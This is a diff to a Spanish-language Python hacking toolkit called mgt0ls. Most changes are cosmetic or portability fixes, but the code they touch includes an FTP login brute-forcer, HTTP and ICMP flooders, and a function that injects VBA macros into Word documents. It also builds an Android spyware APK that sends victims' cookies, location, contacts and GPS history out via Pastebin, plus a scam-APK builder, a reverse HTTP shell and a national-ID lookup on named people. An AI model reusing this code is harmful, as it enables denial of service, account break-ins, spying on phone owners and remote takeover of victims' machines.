@@ -14,9 +14,9 @@ try:
 
 except:
     if "mgt0ls" in os.getcwd():
-        print("[ERROR] setup.py Aun no ah sido ejecutado...")
+        print("[ERROR] setup.py Aun no ah sido ejecutado ...")
     else:
-        print("[ERROR] No estas en la carpeta principal de mgt0ls...")
+        print("[ERROR] No estas en la carpeta principal de mgt0ls ...")
     exit(0)
 
 import sys
@@ -29,13 +29,19 @@ import asyncio
 import pyzipper
 import platform
 import requests
-import aspose.words as aw
 from bs4 import BeautifulSoup
 from tabulate import tabulate
 from hashlib import md5, sha1
 from strgen import StringGenerator
 from googletrans import Translator
 from ftplib import FTP, error_perm, error_reply, error_temp
+
+## Libs with error in linux
+
+SYS_GLOBAL = platform.system().lower()
+
+if "termux" not in ROOT_MAX: # SI NO ES TERMUX
+    import aspose.words as aw
 
 ###################################################################
 
@@ -58,10 +64,10 @@ def lang_cfg(lang):
 
         if lang in verify_:
             root_json["lang"] = lang
-            print(translate("[PASSED] Tu idioma se ah configurado correctamente..."))
+            print(translate("[PASSED] Tu idioma se ah configurado correctamente ..."))
 
         else:
-            print(translate("[ERROR] No tenemos tu idioma en nuestro registro..."))
+            print(translate("[ERROR] No tenemos tu idioma en nuestro registro ..."))
 
         save_lang.write(str(root_json).replace("'", '"'))
 
@@ -70,7 +76,7 @@ async def translate_as(text):
     try:
         trans_ = Translator()
 
-        if "win" in platform.system().lower():
+        if "win" in SYS_GLOBAL:
             detect_ = trans_.translate(text, dest=root_json["lang"], src="es") # Espera para poder retornar
         else:
             detect_ = await trans_.translate(text, dest=root_json["lang"], src="es") # Espera para poder retornar
@@ -99,9 +105,9 @@ def update():
             chek_v = requests.get("https://raw.githubusercontent.com/IND4RKHK/mgt0ls/refs/heads/main/fsh.py")
 
             if chek_v.text != chek_vl:
-                return "[UPDATE] MGT0L$ Tiene una nueva actualizacion disponible..."
+                return "[UPDATE] MGT0L$ Tiene una nueva actualizacion disponible ..."
             else:
-                return "[PASSED] MGT0L$ Esta actualizado a su version mas reciente..."
+                return "[PASSED] MGT0L$ Esta actualizado a su version mas reciente ..."
             
     except Exception as err:
         print(f"[ERROR] {err}")
@@ -109,9 +115,8 @@ def update():
 ###################################################################
 
 def findperson(nombre, arg): # Funciona with
+
     nombre = f"{nombre} /{arg.upper()}"
-
-
 
     def limpieza(limp):
 
@@ -134,10 +139,11 @@ def findperson(nombre, arg): # Funciona with
                 palabra=palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT")
 
                 if "CONTENT:[]" in palabra:
-                    print("[ERROR] {} NO ENCONTRADA".format(nombre).upper())
+                    return "[ERROR] {} NO ENCONTRADA".format(nombre).upper()
                     break
                 else:
-                    print(palabra)
+                    palabra = palabra.replace("CONTENT:",f"[COINCIDENCIA] ==> POSIBLE RUT DE {nombre}: ").split("\n")
+                    return palabra[0]
 
                 #print(palabra.upper().replace("_"," ").replace('"',"").replace("===>",": ").replace("="," ").replace(":RUT","\nRUT"))
 
@@ -232,8 +238,6 @@ def findperson(nombre, arg): # Funciona with
 
         fi.update(fi_update)
         nombre=nombre_temp
-            
-
 
     data= {
     
@@ -244,8 +248,8 @@ def findperson(nombre, arg): # Funciona with
 
     try:
         print(geo())
-    except:
-        print("[ERROR] ALGO SUCEDIO")
+    except Exception as err:
+        print(f"[ERROR] {err}")
         pass
 
 def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
@@ -318,7 +322,7 @@ def ftpbrute(selec, ftpserver, usuario, password): # Deberia funcionar with
                     password=password.strip()
                     vector(usuario,password,ftpserver)
         
-        print("[ERROR] NO SE LOGRO ENCONTRAR NINGUNA COINCIDENCIA...")
+        print("[ERROR] NO SE LOGRO ENCONTRAR NINGUNA COINCIDENCIA ...")
                 
 
 
@@ -418,14 +422,15 @@ def httpflood(URL):
                 else:
                     BYTESEND=BYTESEND+1
 
-        except:
-            print("[ERROR] NOS HAN TIRADO X_X")
+        except Exception as err:
+            print(f"[ERROR] {err}")
             exit(0)
         try:
             cookie_generator()
             atak=requests.get(URL, headers=headers, data=headers, cookies=cookies) # UTILIZA POST SI ES VUL
-        except:
-            print("[ERROR] NOS HAN TIRADO X_X")
+            
+        except Exception as err:
+            print(f"[ERROR] {err}")
             exit(0)
         else:
 
@@ -438,11 +443,9 @@ def icmpdos(ip, pack):
 
     pack = int(pack)
 
-    SYS=platform.system().lower()
-                
     print("ATACANDO => {} CON {}".format(ip,pack))
 
-    if SYS == "windows":
+    if "win" in SYS_GLOBAL:
         os.system("ping -l {} -t {}".format(pack,ip))
     else:
         os.system("ping -s {} {}".format(pack,ip))
@@ -605,7 +608,7 @@ def seeker(usuario): # Funciona with
 
     except:
         
-        print("[ERROR] No tienes conexion a internet...")
+        print("[ERROR] No tienes conexion a internet ...")
         exit(0)
     
 
@@ -953,7 +956,7 @@ def webdumper(select, url, dic_path): # Funciona with
             archivo_dic.close()
 
         except:
-            print("[ERROR] No tienes conexion a internet...")
+            print("[ERROR] No tienes conexion a internet ...")
 
     def inicial_find(url, dic_path):
 
@@ -1034,52 +1037,55 @@ def webdumper(select, url, dic_path): # Funciona with
         if getted != []:
             print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
         else:
-            print("[ERROR] No se han encontrado directorios ocultos...")
+            print("[ERROR] No se han encontrado directorios ocultos ...")
             
     except KeyboardInterrupt:
         print("\n")
         print(tabulate(getted, headers=["DIRECTORIOS ENCONTRADOS", "CODIGO", "ESTADO"], tablefmt="simple"))
     except ValueError:
-        print("[ERROR] Caracter no valido...")
+        print("[ERROR] Caracter no valido ...")
 
 def wordinfect(ruta, macro):
 
-    def integracion():
+    if "termux" not in ROOT_MAX:
+        def integracion():
 
-        # Load Word document.
-        doc = aw.Document(ruta)
-        leer=open(macro)
+            # Load Word document.
+            doc = aw.Document(ruta)
+            leer=open(macro)
 
-        # Create VBA project
-        project = aw.vba.VbaProject()
-        project.name = "MacroProject"
-        doc.vba_project = project
+            # Create VBA project
+            project = aw.vba.VbaProject()
+            project.name = "MacroProject"
+            doc.vba_project = project
 
-        # Create a new module and specify a macro source code.
-        module = aw.vba.VbaModule()
-        module.name = "MacroModule"
-        module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
-        module.source_code = leer.read()
+            # Create a new module and specify a macro source code.
+            module = aw.vba.VbaModule()
+            module.name = "MacroModule"
+            module.type = aw.vba.VbaModuleType.PROCEDURAL_MODULE
+            module.source_code = leer.read()
 
-        # Add module to the VBA project.
-        doc.vba_project.modules.add(module)
+            # Add module to the VBA project.
+            doc.vba_project.modules.add(module)
 
-        # Save document.
-        doc.save(ruta_save)
+            # Save document.
+            doc.save(ruta_save)
 
-        try:
-            ruta_save=ruta.replace(".docm","_2.docm")
-            integracion()
-        except:
-            pass
-        else:
-            print("[WORD INFECTADO] ===> {}".format(ruta_save))
+            try:
+                ruta_save=ruta.replace(".docm","_2.docm")
+                integracion()
+            except:
+                pass
+            else:
+                print("[WORD INFECTADO] ===> {}".format(ruta_save))
+    
+    else:
+        print(translate("[ERROR] Wordinfect aun no disponible en Termux ..."))
 
 def sc4pk(idcap, selec):
 
     selec = selec.lower()
     CONTADOR=0
-    SYS=platform.system().lower()
 
     ver_carpeta=os.listdir(".")
 
@@ -1122,7 +1128,7 @@ def sc4pk(idcap, selec):
 
             shutil.move(os.path.join("Scam_2", "res", "drawable-xhdpi-v4", f"{REMP}.png"), os.path.join("Scam_2", "res", "drawable-xhdpi-v4", "app_icon.png"))
 
-            if "win" in SYS:
+            if "win" in SYS_GLOBAL:
                 print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}/ ->> Scam_2/")
             else:
                 os.chdir("Scam_2/")
@@ -1206,7 +1212,7 @@ def sc4pk(idcap, selec):
         crear(selec, idcap)
     
     else:
-        print("[ERROR] Opcion ingresada no valida...")
+        print("[ERROR] Opcion ingresada no valida ...")
     
     if selec == None:
         
@@ -1221,7 +1227,7 @@ def urljump(select, cant):
         if saved_ != []:
             print("\n",tabulate(saved_, headers=["ENLACES ENCONTRADOS"]))
         else:
-            print(f"---------------------\n[JUMPED] No encontramos ningun enlace valido...")
+            print(f"---------------------\n[JUMPED] No encontramos ningun enlace valido ...")
         exit(0)
 
     
@@ -1320,7 +1326,7 @@ def urljump(select, cant):
         exit_emer_()
     
     else:
-        print("[ERROR] Opcion no encontrada...")
+        print("[ERROR] Opcion no encontrada ...")
 
 def unlocker(type_, dictionary, hash_):
     type_ = type_.lower()
@@ -1349,7 +1355,6 @@ def unlocker(type_, dictionary, hash_):
         print(f"[ERROR] {err}")
 
 def m4cware():
-    SYS = platform.system().lower() # Identificador del S.O
 
     try:
         with open(".id", "r", encoding="utf-8") as one_id_scan:
@@ -1460,7 +1465,7 @@ m4cware->> """))
                                     file_sv = file_sv + str(file_dw.text) + "\n"
                                 with open("targets.txt", "w", encoding="utf-8") as file_fl:
                                     file_fl.write(file_sv)
-                                print("[PASSED] Archivo targets.txt descargado correctamente...")
+                                print("[PASSED] Archivo targets.txt descargado correctamente ...")
                             except Exception as err:
                                 print(f"[ERROR] {err}")
 
@@ -1479,7 +1484,7 @@ m4cware->> """))
                     except Exception as err:
                         print(f"[ERROR] {err}")
             else:
-                print("[ERROR] Aun no se han encontrado victimas...")
+                print("[ERROR] Aun no se han encontrado victimas ...")
                 break
 
     def style_apk():
@@ -1538,7 +1543,7 @@ m4cware->> """))
                     break
 
                 if AC_options[select-1][1] == True:
-                    print("[BUSY] Opcion ya implementada...")
+                    print("[BUSY] Opcion ya implementada ...")
 
                 if select == 1 and AC_options[0][1] == False: # Del file or Dir
                     ac_inp = input("Ingresa la ruta a eliminar: ")
@@ -1569,169 +1574,173 @@ m4cware->> """))
 
     def compilar():
 
-        if len(AC_map) == 4:
-            print("[ERROR] Aun no modificas el APK...")
+        try:
+            if len(AC_map) == 4:
+                print("[ERROR] Aun no modificas el APK ...")
 
-        else:
-            dirs_ = os.listdir(".")
-
-            # Linux y windows
-
-            try:
-                if "apktool.jar" not in dirs_ and "win" in SYS:
-
-                    down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
-                    downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
-                
-                    with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
-                        apk_tool.write(downl_apk.content)
-                        apk_tool_bat.write(down_bat.content)
-            
-            except Exception as err:
-                print(f"[ERROR] {err}")
-            
-            if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
-                shutil.copy(os.path.join("assets", "m4.apk"), ".")
-
-            ## Linux y Windows
-            if "win" in SYS:
-                os.system(".\\apktool.bat m4.apk")
             else:
-                os.system("apktool d m4.apk")
+                dirs_ = os.listdir(".")
 
-            #############################################################
-            #                       Layaut VARS                         #
-            #############################################################
-            strings_ = os.path.join("m4", "res", "values", "strings.xml")
-            colors_ = os.path.join("m4", "res", "values", "colors.xml")
-            pack_age_name_dir = os.path.join("m4", "AndroidManifest.xml")
-            app_icon_ = os.path.join("m4", "res", "drawable-xhdpi", "app_icon.png")
-            size_bin = os.path.join("m4", "assets", "resources.conf")
-            #############################################################
-            #                       Actions VARS                        #
-            #############################################################
-            assets_json = os.path.join("m4", "assets", "info.json")
-            #############################################################
-            #                   Modification of Files                   #
-            #############################################################
-            if LY_options[0][1] != "com.lite.lt":
+                # Linux y windows
 
-                temp_package = LY_options[0][1].replace(".", " ").split()
-                vars_lte = ["com", "lite", "lt"]
+                try:
+                    if "apktool.jar" not in dirs_ and "win" in SYS_GLOBAL:
+
+                        down_bat = requests.get("https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat")
+                        downl_apk = requests.get("https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.10.0.jar")
+                    
+                        with open("apktool.jar", "wb") as apk_tool, open("apktool.bat", "wb") as apk_tool_bat:
+                            apk_tool.write(downl_apk.content)
+                            apk_tool_bat.write(down_bat.content)
                 
-                pack_age_dirs_rename = os.path.join("m4", "smali_classes5", "")
-                vars_rename_lte = os.path.join("m4", "smali_classes5", "")
+                except Exception as err:
+                    print(f"[ERROR] {err}")
                 
-                for i in range(3):
+                if "m4.apk" not in dirs_:             # Importa el apk para trabajar mejor con ella
+                    shutil.copy(os.path.join("assets", "m4.apk"), ".")
 
-                    os.rename(vars_rename_lte+vars_lte[i], pack_age_dirs_rename+temp_package[i])
+                ## Linux y Windows
+                if "win" in SYS_GLOBAL:
+                    os.system(".\\apktool.bat m4.apk")
+                else:
+                    os.system("apktool d m4.apk")
 
-                    pack_age_dirs_rename = os.path.join(pack_age_dirs_rename, temp_package[i], "")
-                    vars_rename_lte = os.path.join(vars_rename_lte, temp_package[i], "")
+                #############################################################
+                #                       Layaut VARS                         #
+                #############################################################
+                strings_ = os.path.join("m4", "res", "values", "strings.xml")
+                colors_ = os.path.join("m4", "res", "values", "colors.xml")
+                pack_age_name_dir = os.path.join("m4", "AndroidManifest.xml")
+                app_icon_ = os.path.join("m4", "res", "drawable-xhdpi", "app_icon.png")
+                size_bin = os.path.join("m4", "assets", "resources.conf")
+                #############################################################
+                #                       Actions VARS                        #
+                #############################################################
+                assets_json = os.path.join("m4", "assets", "info.json")
+                #############################################################
+                #                   Modification of Files                   #
+                #############################################################
+                if LY_options[0][1] != "com.lite.lt":
+
+                    temp_package = LY_options[0][1].replace(".", " ").split()
+                    vars_lte = ["com", "lite", "lt"]
+                    
+                    pack_age_dirs_rename = os.path.join("m4", "smali_classes5", "")
+                    vars_rename_lte = os.path.join("m4", "smali_classes5", "")
+                    
+                    for i in range(3):
+
+                        os.rename(vars_rename_lte+vars_lte[i], pack_age_dirs_rename+temp_package[i])
+
+                        pack_age_dirs_rename = os.path.join(pack_age_dirs_rename, temp_package[i], "")
+                        vars_rename_lte = os.path.join(vars_rename_lte, temp_package[i], "")
+                    
+                    with open(pack_age_name_dir, "r") as pack_age_name:
+                        read_package = pack_age_name.read(); read_package = read_package.replace("com.lite.lt", LY_options[0][1])
+                    
+                    with open(pack_age_name_dir, "w", encoding="utf-8") as pack_age_name:
+                        pack_age_name.write(read_package)
+
+                if LY_options[1][1] != "Lite":
+
+                    with open(strings_, "r") as name:
+                        # LECTURA DE CONTENDIO                ### MODIFICACION DEL CONTENIDO
+                        read_name = name.read(); read_name = read_name.replace("Lite", LY_options[1][1])
+                    with open(strings_, "w", encoding="utf-8") as name:
+                        name.write(read_name)
+
+                if LY_options[2][1] != "#ff000000":
+
+                    with open(colors_, "r") as color:
+                        read_color = color.read(); read_color = read_color.replace("#ff000000", LY_options[2][1])
+                    with open(colors_, "w", encoding="utf-8") as color:
+                        color.write(read_color)
+
+                if LY_options[3][1] != "Default":      # Modifica el icon del apk
+                    os.replace(LY_options[3][1], app_icon_)
                 
-                with open(pack_age_name_dir, "r") as pack_age_name:
-                    read_package = pack_age_name.read(); read_package = read_package.replace("com.lite.lt", LY_options[0][1])
+                if LY_options[5][1] != "0":
+                    #os.mkdir(size_bin.replace("resources.conf", ""))
+
+                    size_ = int(LY_options[5][1]) * 1024 * 1024
+
+                    with open(size_bin, "wb") as binario:
+                        binario.write(os.urandom(size_))
+
+                #############################################################
+                #                       Making JSON                         #
+                #############################################################
+
+                sum_ = 0
+                for numero in AC_options:
+
+                    if numero[1] == True: # Se encarga de solamente sumar las acciones agregadas
+                        sum_ = numero[2] + sum_
                 
-                with open(pack_age_name_dir, "w", encoding="utf-8") as pack_age_name:
-                    pack_age_name.write(read_package)
+                if sum_ >= 32:                      # Problema matematico: Cada vez es el doble de lo anterior, probocado por la suma de estos mismos.
+                    sender_ = "cookies"             # Es decir: La suma de las opciones anteriores + 1 es el siguiente orden de prioridad.
+                if sum_ >= 16 and sum_ < 32:
+                    sender_ = "locate"
+                if sum_ >= 8 and sum_ < 16: 
+                    sender_ = "contacts"
+                if sum_ >= 4 and sum_ < 8:   
+                    sender_ = "ip"
+                if sum_ >= 2 and sum_ < 4:
+                    sender_ = "history_gps"
+                if sum_ == 1:
+                    sender_ = "info"
+                
+                if sum_ > 0:
+                    AC_map.setdefault("sender", sender_) # Configura que parte del codigo en la app envia la informacion 
 
-            if LY_options[1][1] != "Lite":
+                with open(assets_json, "w", encoding="utf-8") as save_json: # Guarda el json encargado del comportamiento del apk
+                    save_json.write(str(AC_map).replace("'", '"'))
+                
+                #############################################################
+                #                Delete Unnecessary Permissions             #
+                #############################################################
 
-                with open(strings_, "r") as name:
-                    # LECTURA DE CONTENDIO                ### MODIFICACION DEL CONTENIDO
-                    read_name = name.read(); read_name = read_name.replace("Lite", LY_options[1][1])
-                with open(strings_, "w", encoding="utf-8") as name:
-                    name.write(read_name)
+                emergency_ = '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n' # Acces_Network nunca se borra, por ende se toma como referencia
 
-            if LY_options[2][1] != "#ff000000":
+                with open(pack_age_name_dir, "r") as android: # Bloque encargado de quitar o dejar permisos dependiendo de la seleccion
+                    lectura = android.read()
 
-                with open(colors_, "r") as color:
-                    read_color = color.read(); read_color = read_color.replace("#ff000000", LY_options[2][1])
-                with open(colors_, "w", encoding="utf-8") as color:
-                    color.write(read_color)
+                    for opciones in AC_options: # Por cada opcion en AC_Options
 
-            if LY_options[3][1] != "Default":      # Modifica el icon del apk
-                os.replace(LY_options[3][1], app_icon_)
-            
-            if LY_options[5][1] != "0":
-                #os.mkdir(size_bin.replace("resources.conf", ""))
+                        if opciones[1] == False and len(opciones[3]) > 1: # Si la opcion con permisos no se esta ocupando Y la opcion tiene mas de 1 permiso
 
-                size_ = int(LY_options[5][1]) * 1024 * 1024
+                            for permiso in opciones[3]: # Por cada permiso se borra de Android Manifest
+                                permiss =  f'    <uses-permission android:name="android.permission.{permiso}"/>\n'
+                                lectura = lectura.replace(permiss, "")
 
-                with open(size_bin, "wb") as binario:
-                    binario.write(os.urandom(size_))
+                        elif opciones[1] == False and opciones[3][0] != "null": # Mientras el permiso no sea null y el permiso no esa ocupandose
 
-            #############################################################
-            #                       Making JSON                         #
-            #############################################################
-
-            sum_ = 0
-            for numero in AC_options:
-
-                if numero[1] == True: # Se encarga de solamente sumar las acciones agregadas
-                    sum_ = numero[2] + sum_
-            
-            if sum_ >= 32:                      # Problema matematico: Cada vez es el doble de lo anterior, probocado por la suma de estos mismos.
-                sender_ = "cookies"             # Es decir: La suma de las opciones anteriores + 1 es el siguiente orden de prioridad.
-            if sum_ >= 16 and sum_ < 32:
-                sender_ = "locate"
-            if sum_ >= 8 and sum_ < 16: 
-                sender_ = "contacts"
-            if sum_ >= 4 and sum_ < 8:   
-                sender_ = "ip"
-            if sum_ >= 2 and sum_ < 4:
-                sender_ = "history_gps"
-            if sum_ == 1:
-                sender_ = "info"
-            
-            if sum_ > 0:
-                AC_map.setdefault("sender", sender_) # Configura que parte del codigo en la app envia la informacion 
-
-            with open(assets_json, "w", encoding="utf-8") as save_json: # Guarda el json encargado del comportamiento del apk
-                save_json.write(str(AC_map).replace("'", '"'))
-            
-            #############################################################
-            #                Delete Unnecessary Permissions             #
-            #############################################################
-
-            emergency_ = '    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n' # Acces_Network nunca se borra, por ende se toma como referencia
-
-            with open(pack_age_name_dir, "r") as android: # Bloque encargado de quitar o dejar permisos dependiendo de la seleccion
-                lectura = android.read()
-
-                for opciones in AC_options: # Por cada opcion en AC_Options
-
-                    if opciones[1] == False and len(opciones[3]) > 1: # Si la opcion con permisos no se esta ocupando Y la opcion tiene mas de 1 permiso
-
-                        for permiso in opciones[3]: # Por cada permiso se borra de Android Manifest
-                            permiss =  f'    <uses-permission android:name="android.permission.{permiso}"/>\n'
+                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
                             lectura = lectura.replace(permiss, "")
 
-                    elif opciones[1] == False and opciones[3][0] != "null": # Mientras el permiso no sea null y el permiso no esa ocupandose
+                        elif opciones[1] == True and opciones[3][0] not in lectura: # Si es que el permiso que se va a ocupar ya se elimino
 
-                        permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
-                        lectura = lectura.replace(permiss, "")
-
-                    elif opciones[1] == True and opciones[3][0] not in lectura: # Si es que el permiso que se va a ocupar ya se elimino
-
-                        permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
-                        lectura = lectura.replace(emergency_, emergency_+permiss) # Agrega el permiso que se necesita
-            
-            with open(pack_age_name_dir, "w", encoding="utf-8") as save_android:
-                save_android.write(lectura)
-            
-            ## Linux y windows
-
-            if "win" in SYS:
-                os.system(".\\apktool.bat b m4 -o m4_moded.apk")
-            else:
-                os.system("apktool b m4 -o m4_moded.apk")
-            
-            try:
-                shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
+                            permiss = f'    <uses-permission android:name="android.permission.{opciones[3][0]}"/>\n'
+                            lectura = lectura.replace(emergency_, emergency_+permiss) # Agrega el permiso que se necesita
                 
-            except Exception as err:
-                print(f"[ERROR] {err}")
+                with open(pack_age_name_dir, "w", encoding="utf-8") as save_android:
+                    save_android.write(lectura)
+                
+                ## Linux y windows
+
+                if "win" in SYS_GLOBAL:
+                    os.system(".\\apktool.bat b m4 -o m4_moded.apk")
+                else:
+                    os.system("apktool b m4 -o m4_moded.apk")
+                
+                try:
+                    shutil.rmtree("m4"); os.remove("m4.apk")  # Elimina los archivos ya ocupados
+                    
+                except Exception as err:
+                    print(f"[ERROR] {err}")
+        
+        except Exception as err:
+            print(f"[ERROR] {err}")
 
     def api_settings():
         while True:
@@ -1750,7 +1759,7 @@ Introduce tu 'api_dev_key' de Pastebin: """)
                     one_id["api_dev_key"] = new_dev; one_id["api_user_key"] = new_user
                     new_paste.write(str(one_id).replace("'", '"'))
 
-                print("[RESET] Claves ingresadas con exito...")
+                print("[RESET] Claves ingresadas con exito ...")
                 exit(0)
 
             except Exception as err:
@@ -1785,7 +1794,6 @@ m4cware->> """))
 
 def reverhttp(url_port):
 
-    SYS = platform.system().lower()
     headers = {"Cache-Control":"no-cache"}
 
     cmd_help="""
@@ -1921,7 +1929,7 @@ WMIC           Muestra información de WMI en el shell de comandos interactivo.
             else:
                 port = int(port)
 
-                if "win" not in SYS:
+                if "win" not in SYS_GLOBAL:
 
                     try:
                         print('[SERVER] CORRIENDO EN ->> http://localhost:{}'.format(port))
@@ -1931,7 +1939,7 @@ WMIC           Muestra información de WMI en el shell de comandos interactivo.
                         print(f"[ERROR] {err}")
                         pass
                 else:
-                    print("[DEVP] Abrir servidor con PHP aun esta en desarrollo...")
+                    print("[DEVP] Abrir servidor con PHP aun esta en desarrollo ...")
 
         except Exception as err:
             print(f"[ERROR] {err}")
@@ -2003,7 +2011,7 @@ WMIC           Muestra información de WMI en el shell de comandos interactivo.
                 escribir.write(leer_str.replace("URL_FUN",server_str))
             
             print("[PASS] Archivo guardado en ./server/reversehttp_clone.py")
-            print("-------------------------------------------------\n[PAUSE] Entrando en modo escucha [20sec]... ")
+            print("-------------------------------------------------\n[PAUSE] Entrando en modo escucha [20sec] ...")
             time.sleep(20)
             maquina(server_str)
 
